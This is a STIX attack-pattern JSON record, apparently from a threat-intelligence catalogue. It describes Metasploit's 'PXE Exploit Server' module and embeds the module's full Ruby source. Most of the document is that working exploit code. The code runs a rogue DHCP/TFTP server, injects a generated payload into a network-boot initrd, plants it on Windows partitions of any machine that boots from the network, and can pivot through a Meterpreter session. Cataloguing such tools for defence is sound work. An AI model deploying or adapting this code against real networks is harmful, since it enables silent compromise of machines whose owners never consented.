{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--833e33aa-3c19-42b9-b0ac-328a50fb5990",
    "created": "2024-08-14T16:49:58.750859Z",
    "modified": "2024-08-14T16:49:58.750864Z",
    "name": "PXE Exploit Server",
    "description": " This module provides a PXE server, running a DHCP and TFTP server. The default configuration loads a linux kernel and initrd into memory that reads the hard drive; placing the payload on the hard drive of any Windows partition seen.  Note: the displayed IP address of a target is the address this DHCP server handed out, not the \"normal\" IP address the host uses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/pxeexploit.rb",
            "external_id": "pxeexploit.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::TFTPServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'PXE Exploit Server',\n      'Description' => %q{\n        This module provides a PXE server, running a DHCP and TFTP server.\n        The default configuration loads a linux kernel and initrd into memory that\n        reads the hard drive; placing the payload on the hard drive of any Windows\n        partition seen.\n\n        Note: the displayed IP address of a target is the address this DHCP server\n        handed out, not the \"normal\" IP address the host uses.\n      },\n      'Author' => [ 'scriptjunkie' ],\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'EXITFUNC' => 'thread',\n        'FILENAME' => 'update1',\n        'SERVEONCE' => true # once they reboot; don't infect again - you'll kill them!\n      },\n      'Payload' => {\n        'Space' => 4500,\n        'DisableNops' => 'True',\n      },\n      'Platform' => 'win',\n      'DisclosureDate' => 'Aug 05 2011',\n      'Targets' => [\n        [\n          'Windows Universal',\n          {\n          }\n        ],\n      ],\n      'Privileged' => true,\n      'Stance' => Msf::Exploit::Stance::Passive,\n      'DefaultTarget' => 0,\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            lanattacks_add_tftp_file\n            lanattacks_dhcp_log\n            lanattacks_reset_dhcp\n            lanattacks_set_dhcp_option\n            lanattacks_start_dhcp\n            lanattacks_start_tftp\n            lanattacks_stop_dhcp\n            lanattacks_stop_tftp\n          ]\n        }\n      }\n    )\n\n    register_options(\n      [\n        OptInt.new('SESSION', [ false, 'A session to pivot the attack through' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('TFTPROOT', [\n          false, 'The TFTP root directory to serve files from',\n          File.join(Msf::Config.data_directory, 'exploits', 'pxexploit')\n        ]),\n        OptString.new('SRVHOST', [ false, 'The IP of the DHCP server' ]),\n        OptString.new('NETMASK', [ false, 'The netmask of the local subnet', '255.255.255.0' ]),\n        OptBool.new('RESETPXE', [ true, 'Resets the server to re-exploit already targeted hosts', false ]),\n        OptString.new('DHCPIPSTART', [ false, 'The first IP to give out' ]),\n        OptString.new('DHCPIPEND', [ false, 'The last IP to give out' ])\n      ]\n    )\n  end\n\n  def exploit\n    # Prepare payload\n    print_status(\"Creating initrd\")\n    initrd = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'pxexploit', 'updatecustom'))\n    uncompressed = Rex::Text.ungzip(initrd)\n    payl = payload.generate\n    uncompressed[uncompressed.index('AAAAAAAAAAAAAAAAAAAAAA'), payl.length] = payl\n    initrd = Rex::Text.gzip(uncompressed)\n\n    # Meterpreter attack\n    if framework.sessions.include? datastore['SESSION']\n      client = framework.sessions[datastore['SESSION']]\n      if not client.lanattacks\n        print_status(\"Loading lanattacks extension...\")\n        client.core.use(\"lanattacks\")\n      else\n        if datastore['RESETPXE']\n          print_status(\"Resetting PXE attack...\")\n          client.lanattacks.dhcp.reset\n        end\n      end\n\n      print_status(\"Loading DHCP options...\")\n      client.lanattacks.dhcp.load_options(datastore)\n      0.upto(4) do |i|\n        print_status(\"Loading file #{i + 1} of 5\")\n        if i < 4\n          contents = File.binread(::File.join(datastore['TFTPROOT'], \"update#{i}\"))\n        else\n          contents = initrd\n        end\n        client.lanattacks.tftp.add_file(\"update#{i}\", contents)\n      end\n      print_status(\"Starting TFTP server...\")\n      client.lanattacks.tftp.start\n      print_status(\"Starting DHCP server...\")\n      client.lanattacks.dhcp.start\n      print_status(\"pxesploit attack started\")\n      while (true) do\n        begin\n          # get stats every 20s\n          select(nil, nil, nil, 20)\n          client.lanattacks.dhcp.log.each do |item|\n            print_status(\"Served PXE attack to #{item[0].unpack('H2H2H2H2H2H2').join(':')} \" +\n                \"(#{Rex::Socket.addr_ntoa(item[1])})\")\n            report_note({\n              :type => 'PXE.client',\n              :data => item[0].unpack('H2H2H2H2H2H2').join(':')\n            })\n          end\n        rescue ::Interrupt\n          print_status(\"Stopping TFTP server...\")\n          client.lanattacks.tftp.stop\n          print_status(\"Stopping DHCP server...\")\n          client.lanattacks.dhcp.stop\n          print_status(\"PXEsploit attack stopped\")\n          return\n        end\n      end\n    end\n\n    # normal attack\n    print_status(\"Starting TFTP server...\")\n    @tftp = Rex::Proto::TFTP::Server.new\n    @tftp.set_tftproot(datastore['TFTPROOT'])\n    @tftp.register_file('update4', initrd)\n    @tftp.start\n\n    print_status(\"Starting DHCP server...\")\n    @dhcp = Rex::Proto::DHCP::Server.new(datastore)\n    @dhcp.report do |mac, ip|\n      print_status(\"Serving PXE attack to #{mac.unpack('H2H2H2H2H2H2').join(':')} \" +\n          \"(#{Rex::Socket.addr_ntoa(ip)})\")\n      report_note({\n        :type => 'PXE.client',\n        :data => mac.unpack('H2H2H2H2H2H2').join(':')\n      })\n    end\n    @dhcp.start\n    print_status(\"pxesploit attack started\")\n\n    # Wait for finish..\n    @tftp.thread.join\n    @dhcp.thread.join\n    print_status(\"pxesploit attack completed\")\n  end\nend\n",
    "x_mitre_disclosure_date": "Aug 05 2011",
    "x_mitre_platforms": [
        "win'"
    ]
}